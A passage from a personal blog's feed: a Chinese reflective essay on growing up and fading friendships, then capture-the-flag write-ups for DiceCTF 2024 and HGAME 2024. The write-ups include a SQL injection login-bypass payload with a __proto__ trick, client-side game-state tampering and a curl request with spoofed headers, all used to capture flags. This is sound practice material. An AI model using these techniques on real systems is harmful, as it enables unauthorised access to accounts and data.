alt="最近很喜欢这张"></p><p>“我的人生目标，就是和你维持现状”<br>人生好像一个个小小的圆圈，每个人穷极所有丰富自己的情感、精神、经历，扩张自己的小领域。相遇就像无数个圆圈的交集，我们在摸索中相识相知，如果足够幸运的话，这个圈子便不断扩大，互相依赖。但大部分时间里，小小的交集总有一天会填满，于是便只能迈入别的新的更鲜活的圈子，便迎来了分离，但这种状态往往难以捉摸。所以说，我们无法预估一个瞬间的价值直到它成为回忆，回首，一切尽在不言中，而人呢，却总是后知后觉。毕竟，谁能料到后来的事呢，意外不总是不期而遇吗，儿时的风再也吹不到现在了</p><p>中学时期的友情似乎都是被迫产生的，被绑定在一个固定的场所，一个城市、一座学校、一间教室…谁也不知道离开了这个地方，这份情谊是不是也跟着散了，也许很多人毕业典礼便是互相的最后一面了。取消了置顶，沉寂的聊天框逐渐刷下，往日热情的话语也变成了冷冰冰的数据丢在了手机的犄角旮旯里。一切似乎在所难免，也都知道是阶段性友谊，也知道怎么可能会有人真的一成不变的陪一你一辈子呢，但就是难以接受，也许自己就是那个幸存者呢。同一个世界里，经历着不同的人生，你也很难说以后会不会再相遇，再相遇又会是在什么样的场景下，也许再提起对方已是连名带姓<br>放假兴起回到高中，想要到处走走看看往日的痕迹，晃晃悠悠中，似乎也没有我能够落脚的地方了，一切都变了模样，新的青春气息扑面而来，一切也都不再属于我。恍惚间，像是做了一场梦，熟悉的地方藏着无人问津的回忆，时间一直在走，你却无能为力<br>有时候也会想要是高三如果没换地方会怎样，不对，我不敢想</p><p>偶然间穿上疫情时穿过的衣服，手习惯性的插入口袋，摸到一个毛茸茸的东西，拿出来一看才发现是之前用过的口罩<br>怀念，又怎么不怀念呢？<br>翻着手机相册，网课时期的一张张相片片刻间就把魂勾回了那个夏天<br>但是我觉得人一辈子就是在学会接受失去，友情爱情亲情，想抓住的东西多了，总有一些会随风而去，散落在回忆里，也许在某个平行时空会有不一样的结果吧。但一切总要继续，偶尔怀念一下就好啦，有些东西就应该藏在记忆里。虽然吧，话都是这么说，但是落差感似乎总是让人难以接受，也许年纪未到吧<br>挺好笑的，我以为我喜欢安安静静听着小歌，独处干着自己的小事，但又接受不了聚会狂欢过后的落差感。<br>小时候和家里人出去旅游很讨厌拍合照，但现在想起试图翻看，却没有几张值得回忆的相片，多少有点可惜吧<br>之前的自己天天发疯发些幼稚的空间或朋友圈，翻看起来，虽然有些尴尬，但熟悉的配图总能回忆起不少东西。<br>跟同学打完球暴走俩小时回家、同学们给的生日惊喜、拼了三年完成的拼图、同学给我编造的段一成绩条、联考出分时说不出的喜悦…</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4079.JPG" alt="IMG_4079"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4178.JPG" alt="IMG_4178"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4072.JPG" alt="IMG_4072"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4078.JPG" alt="IMG_4078"></div></div></div><p>只可惜我拙劣的文笔写不出当时的美好<br>翻着翻着，发现大家好像都在人群中逐渐走散了，短促的变化总是比我们想象中的来得快，只道当时是寻常，</p><p>很喜欢清闲的平日里雨滴清脆落地的声响，总能让我浮躁的心平静下来，坏心情随落下的雨水飘散了<img src="/posts/cf791e74/IMG_20230609_185405.jpg" alt="IMG_20230609_185405"></p><p>一直考虑索要不要考研，这好像是第一次要我决定的大事。不知道是不是要多读会儿书，也许是因为怕累，也许是看到网上的视频怕了。我很害怕父母又跟我扯一堆道理，但过来人的经验又往往不会错。其实也知道工作同样甚至更恼人，但好像真的有点厌倦了为了成绩而卷，这样说好像又是在为自己摆烂找借口。有时候很羡慕很多朋友能够很潇洒，想做什么就能下定决心完成，活在独属于自己的舒适圈里。我总是问为什么人要活得这么累呢？为什么呢？我搞不清楚。但又其实知道如果我不读研将来一定会后悔，但到底又会是在后悔什么。<br>其实机会也很多，我挺幸运的，生在美好的家庭，所以我看到别人的努力的时候，我便会想是不是是我走了捷径，这时候我就会觉得我所谓的累是不是在无病呻吟，是不是我自己咎由自取，我是不是没有喊累的资格，好像是在pua自己，当然也许社会本就不公平。<br>很纠结，我究竟应该以怎样的姿态过我这一辈子。未来又有无尽的变数，真的是有些茫然。<br>百日誓师时写给考后的自己的信，到现在也还没拆开，放了很久，也许已经弄丢了，那句没写完的诗只能在漫漫人生中补齐了<br>看到社会冷暖也会感同身受，但又无可奈何，于是便逐渐麻木，好像已经变成了一种趋势。<br>都说人要为自己而活，但又时常批判利己主义，也知道这两者定义不同，但我总会想是不是自己搞错了两者的界限<br>人在不同阶段得接受能力总是不同的，现在看来，之前的那些破事其实熬熬也就过去了，也许是因为只记得美好的回忆吧。</p><p>一直感觉我是一个悲观主义者，说着不试试怎么知道呢，其实心里已经开始考虑plan b了。总在给别人提供负能量，永远在抱怨，我好像做不成一个耐心的倾听者，很容易被自己的情绪困住，接着又间接影响别人，我好像就是找不到合适的方法来消化，总盼着时间来淡化。<br>我好像什么都不缺，但又好像什么都没有，同频的人越来越少，有些情绪只能咽在肚子里<br>我知道，有很多人应该对我有不同的看法和意见，我当然尊重，毕竟人与人之间视角是不同的。所以在大部分情况下，我不太愿意过多地展示自己真实的情绪，但又希望有人能理解我，又害怕别人看穿我，我其实描述不出我的情绪，我心里就是有事，但我就是不想跟别人说起，以至于有时候分不清我到底是不是发自内心的快乐。我也许一天天发不完的朋友圈，发不完的疯，但总觉自己空虚，总是强装精神，把自己的情绪锁起来。总说着要积极乐观，但烦心事却总不给你消停的机会<br>害怕热情被现实磨灭，绚烂的幻想隐匿于尘埃，总期盼着未来的可能，也想一辈子就干自己喜欢的事，但越大越发现理想主义的花永远不会开在现实主义的土壤中，挥霍的青春总有结束的一天，石头最后也还是没能冲破布<br>“我们一路走来的风景很美，就只差了一步”</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/retouch_2022081318204848.jpg" alt="retouch_2022081318204848"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_1903.JPG" alt="IMG_1903"></div></div></div><p>很久没有惬意的坐在一个地方发呆了，偶然抬头望向窗外的天空，脑海里浮现的却是中学时期的淡粉色晚霞。写着作业，闲时抬起头，不经意间的美好，心中感叹，不多时又再次低头，自然却又特别的滋味</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4175.JPG" alt="IMG_4175"></div><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_3982.JPG" alt="IMG_3982"></div></div><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/IMG_4177.JPG" alt="IMG_4177"></div></div></div><p>曾经幻想中应当风华正茂的18岁也即将走到了尽头，小时候总觉着人生就像是个大型游戏，每天就是刷刷副本，死了就重来呗，有什么大不了，但现在看来好像也不是一回事了。人生路也还长呢，最后还是希望自己能成为儿时口中自由洒脱的人，能拾回那时无限的热忱，保持对新鲜事物的好奇，祝平安喜乐，天天开心</p><p>没什么文采，写不出深沉诗意的句子，熟悉我的朋友应该都知道写作向来是我最不擅长的事，但是写的怎么样除了我又有谁会在意呢。虽然但是，多年以后，估计我自己也会觉得自己“为赋新词强说愁”吧，毕竟谁让“早岁那知世事艰”呢😛😛<img src="/posts/cf791e74/102612.jpg"></p><center><font size="6">朋友啊，我们都长大了</font></center>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Summary</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DiceCtf 2024 Quals Web WriteUps</title>
    <link href="/posts/3f2e31d4/"/>
    <url>/posts/3f2e31d4/</url>
    
    <content type="html"><![CDATA[<h1 id="dicedicegoose"><a href="#dicedicegoose" class="headerlink" title="dicedicegoose"></a>dicedicegoose</h1><p><img src="/posts/3f2e31d4/image-20240205152407464.png" alt="image-20240205152407464">F12审计源码，</p><p><img src="/posts/3f2e31d4/image-20240205152114668.png" alt="image-20240205152114668"></p><p><img src="/posts/3f2e31d4/image-20240205152158905.png" alt="image-20240205152158905"></p><p>简单理解一下，就是 history 数组长度要为9，也就是只能走9步（骰子往下，黑块往左</p><p>因为黑色是随机方向走，所以我们打开控制台，直接修改 history 中黑色的位置历史就行</p><p>先自己走8步</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">i=<span class="hljs-number">9</span>;history.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">innerArray</span> =&gt;</span> &#123;<br>    innerArray[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = i--;<br>    innerArray[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">9</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/posts/3f2e31d4/image-20240205153610723.png" alt="image-20240205153610723"></p><h1 id="funnylogin"><a href="#funnylogin" class="headerlink" title="funnylogin"></a>funnylogin</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-keyword">const</span> db = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;better-sqlite3&#x27;</span>)(<span class="hljs-string">&#x27;db.sqlite3&#x27;</span>);<br>db.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`DROP TABLE IF EXISTS users;`</span>);<br>db.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`CREATE TABLE users(</span><br><span class="hljs-string">    id INTEGER PRIMARY KEY,</span><br><span class="hljs-string">    username TEXT,</span><br><span class="hljs-string">    password TEXT</span><br><span class="hljs-string">);`</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-string">&quot;dice&#123;test_flag&#125;&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>;<br><br><span class="hljs-keyword">const</span> users = [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">100_000</span>)].<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">`user-<span class="hljs-subst">$&#123;crypto.randomUUID()&#125;</span>`</span>, <span class="hljs-attr">pass</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">8</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>) &#125;));<br>db.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`INSERT INTO users (id, username, password) VALUES <span class="hljs-subst">$&#123;users.map((u,i) =&gt; <span class="hljs-string">`(<span class="hljs-subst">$&#123;i&#125;</span>, &#x27;<span class="hljs-subst">$&#123;u.user&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;u.pass&#125;</span>&#x27;)`</span>).join(<span class="hljs-string">&quot;, &quot;</span>)&#125;</span>`</span>);<br><br><span class="hljs-keyword">const</span> isAdmin = &#123;&#125;;<br><span class="hljs-keyword">const</span> newAdmin = users[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * users.<span class="hljs-property">length</span>)];<br>isAdmin[newAdmin.<span class="hljs-property">user</span>] = <span class="hljs-literal">true</span>;<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;public&quot;</span>));<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> &#123; user, pass &#125; = req.<span class="hljs-property">body</span>;<br><br>    <span class="hljs-keyword">const</span> query = <span class="hljs-string">`SELECT id FROM users WHERE username = &#x27;<span class="hljs-subst">$&#123;user&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">$&#123;pass&#125;</span>&#x27;;`</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> id = db.<span class="hljs-title function_">prepare</span>(query).<span class="hljs-title function_">get</span>()?.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (!id) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?message=Incorrect username or password&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (users[id] &amp;&amp; isAdmin[user]) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?flag=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable constant_">FLAG</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?message=This system is currently only available to admins...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/?message=Nice try...&quot;</span>);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`web/funnylogin listening on port <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>));<br></code></pre></td></tr></table></figure><p><img src="/posts/3f2e31d4/image-20240205154302333.png" alt="image-20240205154302333"></p><p>很明显需要sql注入，</p><p><code>1&#39; or 1=1 limit 1,1 --</code></p><p>比较细的点，文件开头生成的 id 是从0开始的，所以需要 <code>limit 1,1</code></p><p>第二个条件需要 <code>users[id]</code> 和 <code>isAdmin[user]</code> ，没有回显，所以没办法得知具体user名</p><p>这里使用<code>__proto__</code>和 <code>1&#39; or 1=1 limit 1,1 --</code>搭配绕过</p><p><img src="/posts/3f2e31d4/image-20240205154921931.png" alt="image-20240205154921931"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME 2024 WEEK-1 WriteUps</title>
    <link href="/posts/b4162f1f/"/>
    <url>/posts/b4162f1f/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p><img src="/posts/b4162f1f/image-20240204201811023.png" alt="image-20240204201811023"></p><p>审计源码可以看到可疑点</p><p><img src="/posts/b4162f1f/image-20240204201951012.png" alt="image-20240204201951012"></p><p>进行单步调试，跳到 js 界面<img src="/posts/b4162f1f/image-20240204202044429.png" alt="image-20240204202044429"></p><p>此时就可以进入控制台查看可疑代码</p><p><code>n=h</code> 所以我们看看 <code>h</code> 是什么</p><p><img src="/posts/b4162f1f/image-20240204202227589.png" alt="image-20240204202227589"></p><p>发现指向 <code>F</code> ，直接传参试试</p><p>得到</p><p><img src="/posts/b4162f1f/image-20240204202324117.png" alt="image-20240204202324117"></p><p>直接调用 <code>s0</code> 看看</p><p><img src="/posts/b4162f1f/image-20240204202418513.png" alt="image-20240204202418513"></p><p>结束</p><p><em><strong><center><font color="#81ecec" size="6"><code>flag&#123;b99b820f-934d-44d4-93df-41361df7df2d&#125;</code></font></center></strong></em></p><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><p>提示需要登录，没有账户所以需要注册</p><p>点击弹 <code>alert</code> 根据提示 <code>This page requires javascript to be enabled :)</code></p><p>把浏览器 <code>禁用Javascript</code> 开了就行</p><p>进注册界面注册个号再登录就行，登录记得把 <code>禁用Javascript</code> 关了</p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;2d2f501efc15bd17039eb7e73f3206dd3d62b19c&#125;</code></font></center></strong></em></p><h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><p>玄学题，等官方WP…</p><h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><p>经典题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -i http://47.102.130.35:31673 --header &quot;Referer: vidar.club&quot; --header &quot;User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot; --header &quot;X-Real-IP: 127.0.0.1&quot;<br></code></pre></td></tr></table></figure><p>得到一串 jwt </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc<br></code></pre></td></tr></table></figure><p><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>解得</p><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;HTTP_!s_1mP0rT4nt&#125;</code></font></center></strong></em></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .data<br>    c db 74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34<br>    flag db 33 dup(0)<br>    format db &quot;plz input your flag: &quot;, 0<br>    success db &quot;Congratulations!&quot;, 0<br>    failure db &quot;Sry, plz try again&quot;, 0<br><br>section .text<br>    global _start<br><br>_start:<br>    ; Print prompt<br>    mov eax, 4<br>    mov ebx, 1<br>    mov ecx, format<br>    mov edx, 20<br>    int 0x80<br><br>    ; Read user input<br>    mov eax, 3<br>    mov ebx, 0<br>    mov ecx, flag<br>    mov edx, 33<br>    int 0x80<br><br>    ; Check flag<br>    xor esi, esi<br>check_flag:<br>    mov al, byte [flag + esi]<br>    xor al, 0x22<br>    cmp al, byte [c + esi]<br>    jne failure_check<br><br>    inc esi<br>    cmp esi, 33<br>    jne check_flag<br><br>    ; Print success message<br>    mov eax, 4<br>    mov ebx, 1<br>    mov ecx, success<br>    mov edx, 14<br>    int 0x80<br><br>    ; Exit<br>    mov eax, 1<br>    xor ebx, ebx<br>    int 0x80<br><br>failure_check:<br>    ; Print failure message<br>    mov eax, 4<br>    mov ebx, 1<br>    mov ecx, failure<br>    mov edx, 18<br>    int 0x80<br><br>    ; Exit<br>    mov eax, 1<br>    xor ebx, ebx<br>    int 0x80<br><br></code></pre></td></tr></table></figure><p>审计（GPT）得 check_flag 中进行了异或</p><p>也就是把 <code>74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34</code> 跟 <code>0x22</code> 进行异或就可以得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 原始数据</span><br>data = [<span class="hljs-number">74</span>, <span class="hljs-number">69</span>, <span class="hljs-number">67</span>, <span class="hljs-number">79</span>, <span class="hljs-number">71</span>, <span class="hljs-number">89</span>, <span class="hljs-number">99</span>, <span class="hljs-number">113</span>, <span class="hljs-number">111</span>, <span class="hljs-number">125</span>, <span class="hljs-number">107</span>, <span class="hljs-number">81</span>, <span class="hljs-number">125</span>, <span class="hljs-number">107</span>, <span class="hljs-number">79</span>, <span class="hljs-number">82</span>, <span class="hljs-number">18</span>, <span class="hljs-number">80</span>, <span class="hljs-number">86</span>, <span class="hljs-number">22</span>, <span class="hljs-number">76</span>, <span class="hljs-number">86</span>, <span class="hljs-number">125</span>, <span class="hljs-number">22</span>, <span class="hljs-number">125</span>, <span class="hljs-number">112</span>, <span class="hljs-number">71</span>, <span class="hljs-number">84</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">81</span>, <span class="hljs-number">17</span>, <span class="hljs-number">95</span>, <span class="hljs-number">34</span>]<br><br><span class="hljs-comment"># 异或操作并转换为字符</span><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(i ^ <span class="hljs-number">0x22</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data)<br><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</code></font></center></strong></em></p><h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>用 <code>pyinstxtractor</code> 把 exe 解包成 pyc</p><p>然后用<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>或者 uncompyle6 反编译得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>flag = [<br>    <span class="hljs-number">87</span>,<br>    <span class="hljs-number">75</span>,<br>    <span class="hljs-number">71</span>,<br>    <span class="hljs-number">69</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">121</span>,<br>    <span class="hljs-number">83</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">117</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">94</span>,<br>    <span class="hljs-number">51</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">91</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">115</span>,<br>    <span class="hljs-number">49</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">108</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">124</span>,<br>    <span class="hljs-number">2</span>]<br>c = [<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">2</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">4</span>]<br><span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;plz input flag:&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">36</span>, <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">input</span>[i]) ^ c[i % <span class="hljs-number">4</span>] != flag[i]:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Sry, try again...&#x27;</span>)<br>        exit()<br>        <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wow!You know a little of python reverse&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br></code></pre></td></tr></table></figure><p>也是异或，稍微改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>flag = [<br>    <span class="hljs-number">87</span>,<br>    <span class="hljs-number">75</span>,<br>    <span class="hljs-number">71</span>,<br>    <span 